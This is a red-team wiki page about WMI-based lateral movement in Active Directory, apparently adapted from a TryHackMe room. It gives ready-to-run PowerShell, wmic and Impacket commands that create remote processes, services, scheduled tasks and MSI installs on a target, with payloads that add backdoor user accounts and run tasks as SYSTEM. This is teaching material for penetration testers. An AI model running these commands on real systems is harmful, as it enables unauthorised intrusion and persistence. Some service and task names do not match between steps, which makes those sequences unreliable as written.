# Pivoting

## Theory

In a red team assesment you will have to pivot throught the network. You will find here some technics about that like

* **Spawn a process remotly**: with PsExec, WinRM, SC (Services), Scheduled Tasks
* **WMI & Lateral Movement**: allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement
* **Alternate Authentication Material**: like NTLM or Kerberos Authentication

## Practice

In this part, you will see various techniques, tools, for Active Directory enumeration. But you will consider that you already have compromise a initial account in the AD.

### WMI & Lateral Movement

Windows Management Instrumentation (WMI) allows administrators to perform standard management tasks that attackers can abuse to perform lateral movement

### Create a WMI Session

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before connecting to WMI through powershell, we need to create a PSCredential object
{% endhint %}

```bash
#Create a PSCredential object:

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

We can now connect to WMI through: DCOM protocol with RPC over port 135 or Wsman with WinRm on ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

```bash
#Create a WMI Session:

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

#store the session on the $Session variable
```
{% endtab %}
{% endtabs %}

### Remote Process Creation Using WMI

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) can be used to create a process and get a shell to WMI.

```bash
#Exec a scheduled command
wmiexec.py domain/username:password@10.10.10.10
```
{% endtab %}

{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
#Execute a command remotely 
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Or with CMD

```bash
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```
{% endtab %}
{% endtabs %}

### Remote Service Creation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

We first create the Service

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "MyService";
DisplayName = "MyService";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Then we Create an Handle to the service and Start it

```bash
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Finaly stop and delete it

```bash
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```
{% endtab %}
{% endtabs %}

### Remote Scheduled Tasks Creation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MyTask"
Start-ScheduledTask -CimSession $Session -TaskName "MyTask"
```

Delete it

```bash
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```
{% endtab %}
{% endtabs %}

### Remote MSI Installation Using WMI

{% tabs %}
{% tab title="Windows" %}
{% hint style="info" %}
Before, we need to create a Cimsession object
{% endhint %}

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

With CMD

```bash
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
{% endtab %}
{% endtabs %}

## Alternate Authentication Material

In this section, we will speak about alternate authentication like NTLM or Kerberos Authentication which allow us to access a Windows account without actually knowing a user’s password itself. You can check for more details on theses techniques on their dedicated Hack-Army articles.

{% content-ref url="kerberos/pass-the-certificate.md" %}
[pass-the-certificate.md](kerberos/pass-the-certificate.md)
{% endcontent-ref %}

{% content-ref url="ntlm/pth.md" %}
[pth.md](ntlm/pth.md)
{% endcontent-ref %}

{% content-ref url="kerberos/ptk.md" %}
[ptk.md](kerberos/ptk.md)
{% endcontent-ref %}

{% content-ref url="kerberos/ptt.md" %}
[ptt.md](kerberos/ptt.md)
{% endcontent-ref %}

{% content-ref url="../../portForward.md" %}
[portForward.md](../../portForward.md)
{% endcontent-ref %}

## References

{% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}
